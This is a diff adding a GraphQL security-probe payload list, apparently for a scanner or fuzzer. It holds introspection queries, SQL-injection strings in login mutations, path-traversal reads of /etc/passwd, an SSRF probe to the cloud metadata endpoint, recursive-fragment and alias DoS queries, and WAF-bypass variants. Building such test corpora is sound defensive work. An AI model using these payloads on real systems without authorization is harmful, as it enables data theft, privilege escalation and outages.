@@ -1,0 +1,106 @@
+# category: graphql
+# description: GraphQL probes — introspection, batching, aliases, fragment loops, injection.
+# references: PortSwigger GraphQL labs, OWASP GraphQL cheatsheet, Apollo security docs.
+
+# ── Introspection ────────────────────────────────────────────────────────
+{"query":"{__schema{types{name}}}"}
+{"query":"query IntrospectionQuery {__schema {queryType {name} mutationType {name} subscriptionType {name} types {...FullType}}}"}
+{"query":"{__type(name:\"User\"){name,fields{name,type{name}}}}"}
+{"query":"{__typename}"}
+{"query":"{__schema{directives{name,args{name}}}}"}
+
+# ── Field disclosure / brute ─────────────────────────────────────────────
+{"query":"{user(id:1){id,name,email,password,role,ssn}}"}
+{"query":"{users{id,email,password}}"}
+{"query":"{me{id,email,permissions,roles}}"}
+{"query":"{system{env,config,secrets}}"}
+{"query":"{debug{logs,requests}}"}
+
+# ── Alias / batching DoS ─────────────────────────────────────────────────
+{"query":"{a:user(id:1){id} b:user(id:2){id} c:user(id:3){id}}"}
+# 1000 aliases — inert shape:
+{"query":"{a1:user{id} a2:user{id} ... a1000:user{id}}"}
+[{"query":"{user{id}}"},{"query":"{user{id}}"},{"query":"{user{id}}"}]
+
+# ── Fragment recursion (DoS probe) ───────────────────────────────────────
+{"query":"query A{...F1} fragment F1 on Query{...F2} fragment F2 on Query{...F1}"}
+{"query":"fragment A on Query{...B} fragment B on Query{...A} {...A}"}
+
+# ── Mutation injection ───────────────────────────────────────────────────
+{"query":"mutation{login(username:\"admin\",password:\"' OR '1'='1\"){token}}"}
+{"query":"mutation{createUser(input:{name:\"x\",role:\"admin\"}){id}}"}
+{"query":"mutation{updateUser(id:1,input:{role:\"admin\"}){id,role}}"}
+{"query":"mutation{deleteUser(id:1){id}}"}
+{"query":"mutation{importData(url:\"file:///etc/passwd\"){content}}"}
+
+# ── Injection inside string args ─────────────────────────────────────────
+{"query":"{user(name:\"' OR '1'='1\"){id}}"}
+{"query":"{user(name:\"a\\\" OR 1=1 -- \"){id}}"}
+{"query":"{file(path:\"../../../etc/passwd\"){content}}"}
+{"query":"{proxy(url:\"http://169.254.169.254/latest/meta-data/\"){body}}"}
+
+# ── Operation-name confusion ────────────────────────────────────────────
+{"query":"query A{__schema{types{name}}} mutation B{login(u:\"x\",p:\"x\"){id}}","operationName":"A"}
+{"query":"query{user{id}}","operationName":"__schema"}
+
+# ── Field suggestion / error-oracle ─────────────────────────────────────
+{"query":"{userz{id}}"}
+{"query":"{paswrd{a}}"}
+{"query":"{secr3t{a}}"}
+{"query":"{internalDebug{logs}}"}
+
+# ── CSRF / GET endpoints ─────────────────────────────────────────────────
+/graphql?query={__schema{types{name}}}
+/graphql?query={me{id,email,password}}
+/graphql?query=mutation{login(u:%22admin%22,p:%22admin%22){token}}
+
+# ── Apollo federation ─────────────────────────────────────────────────────
+{"query":"{_service{sdl}}"}
+{"query":"{_entities(representations:[{__typename:\"User\",id:1}]){...on User{id,email,password}}}"}
+
+# ── GraphQL subscription over WS/SSE ─────────────────────────────────────
+{"type":"connection_init","payload":{}}
+{"type":"start","id":"1","payload":{"query":"subscription{events{payload}}"}}
+{"type":"start","id":"1","payload":{"query":"subscription{logs{line}}"}}
+
+# ── WAF bypass characters ───────────────────────────────────────────────
+{"query":"\n\n{__schema{types{name}}}\n"}
+{"query":" {   __schema   {   types   {   name   }   }   }"}
+{"query":"{__schema{#\n types{name}}}"}
+
+# ── Server-fingerprint via directives ────────────────────────────────────
+{"query":"query{__schema{directives{name,description,args{name,description,type{name,ofType{name}}}}}}"}
+{"query":"{__typename @skip(if:true)}"}
+{"query":"{__typename @include(if:false)}"}
+
+# ── Mutation-batching (SQLi / NoSQLi via arg) ────────────────────────────
+{"query":"mutation{a:login(u:\"'OR 1=1--\",p:\"x\"){t} b:login(u:\"admin\",p:\"'OR'1'='1\"){t}}"}
+
+# ── Object-ID-encoded brute (relay-style ids) ────────────────────────────
+{"query":"{node(id:\"VXNlcjox\"){...on User{email,role}}}"}
+{"query":"{node(id:\"VXNlcjow\"){...on User{email,role}}}"}
+{"query":"{node(id:\"VXNlcjotMQ==\"){...on User{email,role}}}"}
+{"query":"{node(id:\"QWRtaW46MQ==\"){...on Admin{email}}}"}
+
+# ── Introspection via file-upload / websocket-subprotocol ────────────────
+subprotocol: graphql-transport-ws
+subprotocol: graphql-ws
+POST /graphql with multipart (file-upload attack surface)
+
+# ── Nested-fragment DoS (bigger) ─────────────────────────────────────────
+{"query":"fragment F on Query{...F} {...F}"}
+{"query":"fragment A on Query{...B ...C ...D ...E ...F ...G ...H} fragment B on Query{...A} fragment C on Query{...A} ... "}
+
+# ── __schema under disguise (APQ bypass) ────────────────────────────────
+{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}}
+{"operationName":"__schema","query":"{__schema{types{name}}}"}
+{"query":"{   __schema   {   types   {   name   fields {  name type { name } }   }   }   }"}
+
+# ── Field-suggestion typo exploitation ───────────────────────────────────
+{"query":"{users_}"}
+{"query":"{admin_}"}
+{"query":"{internal_}"}
+{"query":"{debug_}"}
+{"query":"{__typeNam}"}
+{"query":"{getUser{}}"}
+{"query":"{curentUser{id}}"}
